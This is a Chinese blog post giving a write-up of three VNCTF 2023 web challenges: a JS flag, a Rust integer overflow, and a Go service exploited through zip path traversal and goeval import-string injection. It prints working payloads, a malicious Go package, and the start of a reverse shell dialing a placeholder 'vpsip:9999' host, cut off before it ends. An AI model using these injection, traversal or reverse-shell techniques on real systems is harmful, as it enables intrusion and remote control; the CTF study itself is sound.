<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="2023VNCTF Web" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--注意：首页既不是post也不是page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--返回顶部css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--目录-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* 箭头的颜色 */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* 边框的颜色 */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* 设置滚动条拖动块的颜色 */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">一切都是兴趣使然</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">首页</a></li>
            
        
            
                <li><a href="/list/">文章</a></li>
            
        
            
                <li><a href="/tags/">标签</a></li>
            
        
            
                <li><a href="/categories/">分类</a></li>
            
        
            
                <li><a href="/about/">关于</a></li>
            
        
            
                <li><a href="/friends/">友链</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--说明是文章post页面-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            2023VNCTF Web
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90"><span class="post-toc-text">象棋王子</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%94%B5%E5%AD%90%E6%9C%A8%E9%B1%BC"><span class="post-toc-text">电子木鱼</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BabyGo"><span class="post-toc-text">BabyGo</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="post-toc-text">0x00 前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 题解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="post-toc-text">方法一 代码注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BD%BF%E7%94%A8%E5%88%AB%E5%90%8D%E6%89%A7%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8C%85"><span class="post-toc-text">方法二 使用别名执行自己的包</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="post-toc-text">0x03 参考文章</span></a></li></ol></li></ol>
            
        
        <p>比赛的时候在回学校的路上，所以没有打，听说质量挺高，赛后做一下</p>
<h1 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h1><p>一个普通的js游戏，玩过关了就给flag，所以flag肯定在前端源码里</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508972.png" alt="image-20230219150751192"></p>
<p>这里就是弹flag的js，只不过被混淆了，直接复制到控制台执行就行</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508558.png" alt="image-20230219150828450"></p>
<h1 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h1><p>一个整数溢出</p>
<p>源码</p>
<pre><code class="rust">use actix_files::Files;
use actix_web::&#123;
    error, get, post,
    web::&#123;self, Json&#125;,
    App, Error, HttpResponse, HttpServer,
&#125;;
use once_cell::sync::Lazy;
use serde::&#123;Deserialize, Serialize&#125;;
use std::sync::&#123;Arc, Mutex&#125;;
use tera::&#123;Context, Tera&#125;;

static GONGDE: Lazy&lt;ThreadLocker&lt;i32&gt;&gt; = Lazy::new(|| ThreadLocker::from(0));

#[derive(Debug, Clone, Default)]
struct ThreadLocker&lt;T&gt; &#123;
    value: Arc&lt;Mutex&lt;T&gt;&gt;,
&#125;

impl&lt;T: Clone&gt; ThreadLocker&lt;T&gt; &#123;
    fn get(&amp;self) -&gt; T &#123;
        let mutex = self.value.lock().unwrap();
        mutex.clone()
    &#125;
    fn set(&amp;self, val: T) &#123;
        let mut mutex = self.value.lock().unwrap();
        *mutex = val;
    &#125;
    fn from(val: T) -&gt; ThreadLocker&lt;T&gt; &#123;
        ThreadLocker::&lt;T&gt; &#123;
            value: Arc::new(Mutex::new(val)),
        &#125;
    &#125;
&#125;

#[derive(Serialize)]
struct APIResult &#123;
    success: bool,
    message: &amp;&#39;static str,
&#125;

#[derive(Deserialize)]
struct Info &#123;
    name: String,
    quantity: i32,
&#125;

#[derive(Debug, Copy, Clone, Serialize)]
struct Payload &#123;
    name: &amp;&#39;static str,
    cost: i32,
&#125;

const PAYLOADS: &amp;[Payload] = &amp;[
    Payload &#123;
        name: &quot;Cost&quot;,
        cost: 10,
    &#125;,
    Payload &#123;
        name: &quot;Loan&quot;,
        cost: -1_000,
    &#125;,
    Payload &#123;
        name: &quot;CCCCCost&quot;,
        cost: 500,
    &#125;,
    Payload &#123;
        name: &quot;Donate&quot;,
        cost: 1,
    &#125;,
    Payload &#123;
        name: &quot;Sleep&quot;,
        cost: 0,
    &#125;,
];

#[get(&quot;/&quot;)]
async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; &#123;
    let mut context = Context::new();

    context.insert(&quot;gongde&quot;, &amp;GONGDE.get());

    if GONGDE.get() &gt; 1_000_000_000 &#123;
        context.insert(
            &quot;flag&quot;,
            &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag&#123;test_flag&#125;&quot;.to_string()),
        );
    &#125;

    match tera.render(&quot;index.html&quot;, &amp;context) &#123;
        Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)),
        Err(err) =&gt; Err(error::ErrorInternalServerError(err)),
    &#125;
&#125;

#[get(&quot;/reset&quot;)]
async fn reset() -&gt; Json&lt;APIResult&gt; &#123;
    GONGDE.set(0);
    web::Json(APIResult &#123;
        success: true,
        message: &quot;重开成功，继续挑战佛祖吧&quot;,
    &#125;)
&#125;

#[post(&quot;/upgrade&quot;)]
async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; &#123;
    if GONGDE.get() &lt; 0 &#123;
        return web::Json(APIResult &#123;
            success: false,
            message: &quot;功德都搞成负数了，佛祖对你很失望&quot;,
        &#125;);
    &#125;

    if body.quantity &lt;= 0 &#123;
        return web::Json(APIResult &#123;
            success: false,
            message: &quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;,
        &#125;);
    &#125;

    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) &#123;
        let mut cost = payload.cost;

        if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; &#123; //只有这两个会给cost翻倍数
            cost *= body.quantity;
        &#125;

        if GONGDE.get() &lt; cost as i32 &#123;
            return web::Json(APIResult &#123;
                success: false,
                message: &quot;功德不足&quot;,
            &#125;);
        &#125;

        if cost != 0 &#123;
            GONGDE.set(GONGDE.get() - cost as i32);
        &#125;

        if payload.name == &quot;Cost&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;小扣一手功德&quot;,
            &#125;);
        &#125; else if payload.name == &quot;CCCCCost&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;功德都快扣没了，怎么睡得着的&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Loan&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Donate&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;好人有好报&quot;,
            &#125;);
        &#125; else if payload.name == &quot;Sleep&quot; &#123;
            return web::Json(APIResult &#123;
                success: true,
                message: &quot;这是什么？床，睡一下&quot;,
            &#125;);
        &#125;
    &#125;

    web::Json(APIResult &#123;
        success: false,
        message: &quot;禁止开摆&quot;,
    &#125;)
&#125;

#[actix_web::main]
async fn main() -&gt; std::io::Result&lt;()&gt; &#123;
    let port = std::env::var(&quot;PORT&quot;)
        .unwrap_or_else(|_| &quot;2333&quot;.to_string())
        .parse()
        .expect(&quot;Invalid PORT&quot;);

    println!(&quot;Listening on 0.0.0.0:&#123;&#125;&quot;, port);

    HttpServer::new(move || &#123;
        let tera = match Tera::new(&quot;src/templates/**/*.html&quot;) &#123;
            Ok(t) =&gt; t,
            Err(e) =&gt; &#123;
                println!(&quot;Error: &#123;&#125;&quot;, e);
                ::std::process::exit(1);
            &#125;
        &#125;;
        App::new()
            .app_data(web::Data::new(tera))
            .service(Files::new(&quot;/asset&quot;, &quot;src/templates/asset/&quot;).prefer_utf8(true))
            .service(index)
            .service(upgrade)
            .service(reset)
    &#125;)
    .bind((&quot;0.0.0.0&quot;, port))?
    .run()
    .await
&#125;
</code></pre>
<p>i32的范围是-2147483648到2147483647，所以只要在Cost那将减的数量变成大于2147483648，就可以造成溢出，从而得到flag</p>
<p>在<code>/upgrade</code>路由</p>
<pre><code class="bash">name=Cost&amp;quantity=214748365
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302211113243.png" alt="image-20230221111324074"></p>
<h1 id="BabyGo"><a href="#BabyGo" class="headerlink" title="BabyGo"></a>BabyGo</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这题在机场等同学的时候做了一下，但是那个解压功能一直报错，我还以为是我的问题，结构第二天做一下发现是可以的</p>
<ul>
<li>goeval代码注入</li>
<li>filepath.Clean构造任意解压路径</li>
</ul>
<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><pre><code class="go">package main

import (
    &quot;encoding/gob&quot;
    &quot;fmt&quot;
    &quot;github.com/PaulXu-cn/goeval&quot;
    &quot;github.com/duke-git/lancet/cryptor&quot;
    &quot;github.com/duke-git/lancet/fileutil&quot;
    &quot;github.com/duke-git/lancet/random&quot;
    &quot;github.com/gin-contrib/sessions&quot;
    &quot;github.com/gin-contrib/sessions/cookie&quot;
    &quot;github.com/gin-gonic/gin&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;path/filepath&quot;
    &quot;strings&quot;
)

type User struct &#123;
    Name  string
    Path  string
    Power string
&#125;

func main() &#123;
    r := gin.Default()
    store := cookie.NewStore(random.RandBytes(16))
    r.Use(sessions.Sessions(&quot;session&quot;, store))
    r.LoadHTMLGlob(&quot;template/*&quot;)

    r.GET(&quot;/&quot;, func(c *gin.Context) &#123;
        userDir := &quot;/tmp/&quot; + cryptor.Md5String(c.ClientIP()+&quot;VNCTF2023GoGoGo~&quot;) + &quot;/&quot;
        session := sessions.Default(c)
        session.Set(&quot;shallow&quot;, userDir)
        session.Save()
        fileutil.CreateDir(userDir)
        gobFile, _ := os.Create(userDir + &quot;user.gob&quot;)
        user := User&#123;Name: &quot;ctfer&quot;, Path: userDir, Power: &quot;low&quot;&#125;
        encoder := gob.NewEncoder(gobFile)
        encoder.Encode(user)
        if fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+&quot;user.gob&quot;) &#123;
            c.HTML(200, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Your path: &quot; + userDir&#125;)
            return
        &#125;
        c.HTML(500, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to make user dir&quot;&#125;)
    &#125;)

    r.GET(&quot;/upload&quot;, func(c *gin.Context) &#123;
        c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;upload me!&quot;&#125;)
    &#125;)

    r.POST(&quot;/upload&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
        fileutil.CreateDir(userUploadDir)
        file, err := c.FormFile(&quot;file&quot;)
        if err != nil &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no file upload&quot;&#125;)
            return
        &#125;
        ext := file.Filename[strings.LastIndex(file.Filename, &quot;.&quot;):]
        if ext == &quot;.gob&quot; || ext == &quot;.go&quot; &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Hacker!&quot;&#125;)
            return
        &#125;
        filename := userUploadDir + file.Filename
        if fileutil.IsExist(filename) &#123;
            fileutil.RemoveFile(filename)
        &#125;
        err = c.SaveUploadedFile(file, filename)
        if err != nil &#123;
            c.HTML(500, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to save file&quot;&#125;)
            return
        &#125;
        c.HTML(200, &quot;upload.html&quot;, gin.H&#123;&quot;message&quot;: &quot;file saved to &quot; + filename&#125;)
    &#125;)

    r.GET(&quot;/unzip&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
        files, _ := fileutil.ListFileNames(userUploadDir)
        destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))
        for _, file := range files &#123;
            if fileutil.MiMeType(userUploadDir+file) == &quot;application/zip&quot; &#123;
                err := fileutil.UnZip(userUploadDir+file, destPath)
                if err != nil &#123;
                    c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to unzip file&quot;&#125;)
                    return
                &#125;
                fileutil.RemoveFile(userUploadDir + file)
            &#125;
        &#125;
        c.HTML(200, &quot;zip.html&quot;, gin.H&#123;&quot;message&quot;: &quot;success unzip&quot;&#125;)
    &#125;)

    r.GET(&quot;/backdoor&quot;, func(c *gin.Context) &#123;
        session := sessions.Default(c)
        if session.Get(&quot;shallow&quot;) == nil &#123;
            c.Redirect(http.StatusFound, &quot;/&quot;)
        &#125;
        userDir := session.Get(&quot;shallow&quot;).(string)
        if fileutil.IsExist(userDir + &quot;user.gob&quot;) &#123;
            file, _ := os.Open(userDir + &quot;user.gob&quot;)
            decoder := gob.NewDecoder(file)
            var ctfer User
            decoder.Decode(&amp;ctfer)
            if ctfer.Power == &quot;admin&quot; &#123;
                eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))
                if err != nil &#123;
                    fmt.Println(err)
                &#125;
                c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: string(eval)&#125;)
                return
            &#125; else &#123;
                c.HTML(200, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;low power&quot;&#125;)
                return
            &#125;
        &#125; else &#123;
            c.HTML(500, &quot;backdoor.html&quot;, gin.H&#123;&quot;message&quot;: &quot;no such user gob&quot;&#125;)
            return
        &#125;
    &#125;)

    r.Run(&quot;:80&quot;)
&#125;
</code></pre>
<p>总体来说不是太难理解</p>
<p><code>/</code>路由，生成一个<code>userDir</code>并保存在<code>Session</code>里，后面的部分都会从Session取这个的值进行操作<br>并且还会创建一个<code>user.gob</code>文件，将User信息保存在里面</p>
<p><code>/upload</code>路由，将文件上传到userDir+”uploads&#x2F;“目录，并且会检测文件后缀</p>
<p><code>/unzip</code>路由，会对userDir+”uploads&#x2F;“目录里的zip文件进行解压，且目的路径可控，接受GET传参的path的值</p>
<pre><code class="go">destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))
</code></pre>
<p>然后来看看这个<code>filepath.Clean</code>是什么东西</p>
<blockquote>
<p>Clean通过纯词法处理返回与path相当的最短路径名称。它反复应用以下规则，直到不能再做进一步处理。</p>
<ol>
<li><p>用一个元素替换多个Separator元素。</p>
</li>
<li><p>消除每个.路径名元素（当前目录）。</p>
</li>
<li><p>消除每个内部的..路径名称元素（父目录）和它前面的非..元素。</p>
</li>
<li><p>消除了将..放在根路径后面的情况（’&#x2F;..’)：也就是说，假设Separator是’&#x2F;‘，在一个路径的开头用”&#x2F;“替换”&#x2F;..”。</p>
</li>
<li><p>返回的路径只有在代表根目录时才以斜线结尾，例如Unix系统中的”&#x2F;“或Windows系统中的<code>C:</code></p>
</li>
</ol>
<p>最后，任何出现的斜线都被Separator替换。</p>
<p>如果这个过程的结果是一个空字符串，Clean返回字符串”.”。</p>
<p>from <a target="_blank" rel="noopener" href="https://pkg.go.dev/path/filepath#Clean">https://pkg.go.dev/path/filepath#Clean</a></p>
</blockquote>
<p>所以我们可以构造路径，将文件解压到任何我们可以解压的地方</p>
<p><code>/backdoor</code>路由，会从userDir目录读取<code>user.gob</code>文件的内容，并检测<code>Power</code>键的值是否为”admin”，如果为True，就执行</p>
<pre><code class="go">eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))
</code></pre>
<p>并返回执行结果</p>
<p>所以可以在本地构造一个user.gob，将<code>Power</code>的值改为”admin”并将其压缩，然后上传并解压到userDir目标覆盖原来的user.gob，这样就可以成功执行到<code>goeval.Eval()</code>了</p>
<p>而在<code>goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))</code>里可以发现并没有可以直接执行任意代码的地方，可控的只有第三个参数</p>
<p><code>goeval.Eval()</code>的第三参数可以进行包的导入，因为通过报错可以执行题目环境GO的src目录，所以我最开始想的是在fmt包里导入一个函数<code>Println</code>，这样在执行<code>goeval.Eval()</code>的时候就可以执行我们自己构造的代码。</p>
<p>但是我想少了，如果直接将pkg传参为fmt的话，因为在Println()被fmt包里的其他文件被定义过，所以我这再定义一个就会报错</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191556105.png" alt="image-20230219155657021"></p>
<p>然后我就随手搜了一下goeval.Eval，就发现了可以对goeval.Eval进行代码注入，从而远程执行代码</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191557626.png" alt="image-20230219155756587"></p>
<p>根据这篇文件去看看goeval.Eval的<a target="_blank" rel="noopener" href="https://github.com/PaulXu-cn/goeval/blob/v0.1.1/eval.go#L44">源码</a></p>
<pre><code class="go">func Eval(defineCode string, code string, imports ...string) (re []byte, err error) &#123;
    var (
        tmp = `package main
%s
%s
func main() &#123;
%s
&#125;
`
        importStr string
        fullCode string
     	newTmpDir = tempDir + dirSeparator + RandString(8)
    )

    if 0 &lt; len(imports) &#123;
        importStr = &quot;import (&quot;
        for _, item := range imports &#123;
            if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd &#123;
                importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
            &#125; else &#123;
                importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
            &#125;
        &#125;
        importStr += &quot;\n)&quot;
    &#125;
    fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)

    var codeBytes = []byte(fullCode)
    // 格式化输出的代码
    if formatCode, err := format.Source(codeBytes); nil == err &#123;
        // 格式化失败，就还是用 content 吧
        codeBytes = formatCode
    &#125;

    // 创建目录
    if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err &#123;
        return
    &#125;
    defer os.RemoveAll(newTmpDir)
    // 创建文件
    tmpFile, err := os.Create(newTmpDir + dirSeparator + &quot;main.go&quot;)
    if err != nil &#123;
        return re, err
    &#125;
    defer os.Remove(tmpFile.Name())
    // 代码写入文件
    tmpFile.Write(codeBytes)
    tmpFile.Close()
    // 运行代码
    cmd := exec.Command(&quot;go&quot;, &quot;run&quot;, tmpFile.Name())
    res, err := cmd.CombinedOutput()
    return res, err
&#125;
</code></pre>
<p>可以看出来，Eval是将代码写入一个临时文件然后运行再返回运行的结果，而且是以拼接的方式来写入代码</p>
<p>所以可以进行代码注入，用<code>\t</code>替代空格，同时由于他执行的是main内的代码，而且这个是写死的，所以得将要执行的代码写入init()里，这个函数会在main()前执行，然后使用var来闭合最后面的<code>&quot;)</code></p>
<p>init函数特性</p>
<blockquote>
<p>1.init函数可以在所有程序执行开始前被调用，并且每个包下可以有多个init函数<br>2.init函数先于main函数自动执行<br>3.每个包中可以有多个init函数，每个包中的源文件中也可以有多个init函数<br>4.init函数没有输入参数、返回值，也未声明，所以无法引用<br>5.不同包的init函数按照包导入的依赖关系决定执行顺序<br>6.无论包被导入多少次，init函数只会被调用一次，也就是只执行一次<br>7.init函数在代码中不能被显示的调用，不能被引用（赋值给函数变量），否则会出现编译错误<br>8.导入包不要出现循环依赖，这样会导致程序编译失败<br>9.Go程序仅仅想要用一个package的init执行，我们可以这样使用：import _ “test_xxxx”，导入包的时候加上下划线就ok了<br>10.包级别的变量初始化、init函数执行，这两个操作都是在同一个goroutine中调用的，按顺序调用，一次一个包<br>11.init函数不应该依赖任何在main函数里创建的变量，因为init函数的执行是在main函数之前的<br>12.在init函数中也可以启动goroutine，也就是在初始化的同时启动新的goroutine，这并不会影响初始化顺序<br>13.复杂逻辑不建议使用init函数，会增加代码的复杂性，可读性也会下降<br>14.一个源文件下可以有多个init函数，代码比较长时可以考虑分多个init函数<br>15.编程时不要依赖init的顺序</p>
</blockquote>
<pre><code class="go">pkg := &quot;os/exec\&quot;\n\&quot;fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;ls\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\nvar(\na=\&quot;1&quot;
goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, pkg)
</code></pre>
<p>就会执行</p>
<pre><code class="go">package main

import (
&quot;os/exec&quot;
&quot;fmt&quot;
)

func	init()&#123;
cmd:=exec.Command(&quot;ls&quot;)
out,_:=cmd.CombinedOutput()
fmt.Println(string(out))
&#125;
var(
a=&quot;1&quot;
)



func main() &#123;
fmt.Println(&quot;Good&quot;)
&#125;
</code></pre>
<h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><h3 id="方法一-代码注入"><a href="#方法一-代码注入" class="headerlink" title="方法一 代码注入"></a>方法一 代码注入</h3><p>先在本地创建一个user.gob文件，就跟源码里的方式一样建一个再压缩</p>
<p>然后上传文件，再解压缩文件</p>
<p>解压缩的url为</p>
<pre><code class="bash">/unzip?path=../../../../tmp/49c69cef49dc4b3be71e988a20149ca7
</code></pre>
<p>然后访问<code>/backdoor</code>路由，进行代码注入，远程执行命令</p>
<p>payload</p>
<pre><code class="bash">/backdoor?pkg=os%2Fexec%22%0A%22fmt%22%0A%29%0A%0Afunc%09init%28%29%7B%0Acmd%3A%3Dexec.Command%28%22cat%22%2C%22%2Fffflllaaaggg%22%29%0Aout%2C_%3A%3Dcmd.CombinedOutput%28%29%0Afmt.Println%28string%28out%29%29%0A%7D%0Avar%28%0Aa%3D%221
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191641018.png" alt="image-20230219164136927"></p>
<h3 id="方法二-使用别名执行自己的包"><a href="#方法二-使用别名执行自己的包" class="headerlink" title="方法二 使用别名执行自己的包"></a>方法二 使用别名执行自己的包</h3><p>这是我在写wp的时候发现的另一个方法</p>
<p>看一下Eval对第三个参数的区别处理</p>
<pre><code class="go">for _, item := range imports &#123;
    if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd &#123;
        importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
    &#125; else &#123;
        importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
    &#125;
&#125;
</code></pre>
<p>eg:</p>
<pre><code class="go">goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, &quot;fmt os/exec&quot;)
</code></pre>
<p>就会变成</p>
<pre><code class="go">package main

import (
 fmt &quot;os/exec&quot;
)



func main() &#123;
fmt.Println(&quot;Good&quot;)
&#125;
</code></pre>
<p>相当于给导入的包设置一个别名,所以可以将我们自己的包设置别名为fmt，从而执行任意代码</p>
<p>自己建立的包</p>
<p><code>PrintLn.go</code></p>
<pre><code class="go">package v2i

import (
    &quot;fmt&quot;
    &quot;os/exec&quot;
)
func Println(a string)&#123;
    _=a
    cmd:=exec.Command(&quot;ls&quot;, &quot;/&quot;)
    out,_:=cmd.CombinedOutput()
    fmt.Println(string(out))
&#125;
</code></pre>
<p>将文件压缩，然后上传，解压到<code>/usr/local/go/src/v2i</code></p>
<p>路径在报错里看到</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191647878.png" alt="image-20230219164700793"></p>
<pre><code class="bash">/unzip?path=../../../../usr/local/go/src/v2i
</code></pre>
<p>然后在<code>/backdoor</code>路由</p>
<pre><code class="bash">/backdoor?pkg=fmt v2i
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191648789.png" alt="image-20230219164845696"></p>
<p>这样就执行了我们的代码，但是有点麻烦，得不断上传解压缩</p>
<p>但也可以试试反弹shell，如果要反弹shell的话，自己建的包就得是【从网上抄的代码XD】</p>
<pre><code class="go">package v2i
import (
    &quot;io&quot;
    &quot;net&quot;
    &quot;io/ioutil&quot;
    &quot;log&quot;
    &quot;os/exec&quot;
)

var (
    cmd string
    line string
)

func Println(a string) &#123;
    _=a
    addr := &quot;vpsip:9999&quot; //远程连接主机名
    conn,err := net.Dial(&quot;tcp&quot;,addr) //拨号操作，用于连接服务端，需要指定协议。
    if err != nil &#123;
        log.Fatal(err)
    &#125;

